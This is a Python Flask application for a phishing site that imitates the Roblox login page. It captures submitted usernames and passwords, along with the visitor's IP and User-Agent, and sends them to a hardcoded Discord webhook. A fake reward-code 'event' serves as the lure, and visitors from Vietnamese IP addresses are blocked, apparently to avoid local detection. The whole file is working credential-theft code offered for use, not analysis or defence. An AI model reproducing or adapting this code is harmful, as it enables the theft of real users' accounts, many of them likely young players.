import os
import json
import requests
from flask import Flask, request, render_template, redirect, url_for, session
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ===== WEBHOOK DISCORD =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532691636918812787/kY9rrENUhkJJJHA6fAEh0zLw24sM1kIqb8QiOp_HSVrtn0aObUC22gV5nH8M4pgbuh-9"

# ===== KIỂM TRA IP VIỆT NAM =====
def get_real_ip():
    if 'X-Forwarded-For' in request.headers:
        ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

def is_vietnam_ip(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=countryCode", timeout=2)
        if r.status_code == 200:
            data = r.json()
            return data.get('countryCode') == 'VN'
    except:
        pass
    return False

# ===== GỬI DISCORD =====
def send_discord(username, password, ip, user_agent):
    embed = {
        "embeds": [{
            "title": "🎯 ROBLOX CREDENTIALS",
            "color": 0xff5500,
            "fields": [
                {"name": "👤 Username", "value": username, "inline": True},
                {"name": "🔑 Password", "value": password, "inline": True},
                {"name": "🌐 IP", "value": ip, "inline": True},
                {"name": "📱 User-Agent", "value": user_agent[:100], "inline": False},
                {"name": "🕒 Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
            ],
            "footer": {"text": "Phishing Clone - Roblox"}
        }]
    }
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed)
        if r.status_code == 204:
            print("[+] Webhook sent.")
        else:
            print(f"[-] Webhook error: {r.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

# ===== MIDDLEWARE CHẶN IP VN =====
@app.before_request
def block_vietnam():
    ip = get_real_ip()
    if is_vietnam_ip(ip):
        return render_template('blocked.html'), 403

# ===== ROUTES =====
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', '')

    if not username or not password:
        return render_template('login.html', error="Vui lòng nhập tên người dùng và mật khẩu.")

    session['username'] = username
    send_discord(username, password, ip, ua)
    return redirect(url_for('event'))

@app.route('/event')
def event():
    if 'username' not in session:
        return redirect(url_for('index'))
    return render_template('event.html', username=session['username'])

@app.route('/redeem', methods=['POST'])
def redeem():
    code = request.form.get('code', '').strip()
    if code == "HEV-789-ev-12B820CODE":
        return render_template('reward.html', username=session.get('username', ''))
    else:
        return render_template('event.html', username=session.get('username', ''), error="❌ Mã code không hợp lệ. Vui lòng thử lại.")

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
